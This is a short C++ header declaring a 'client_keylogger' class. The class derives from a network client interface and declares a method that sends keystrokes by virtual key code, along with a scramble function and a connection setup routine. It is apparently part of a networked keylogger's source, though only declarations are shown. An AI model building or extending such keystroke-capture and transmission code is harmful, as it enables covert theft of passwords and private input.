#include "kqnet.h"
#include "common.h"

class client_keylogger 
	: public kq::client_interface<messageType>
{
public:
	client_keylogger(uint64_t(*scrambleFunc)(uint64_t));
	~client_keylogger();
	void sendKeyStroke(DWORD virtualKeyCode);

private:
	void connctInnit();

};

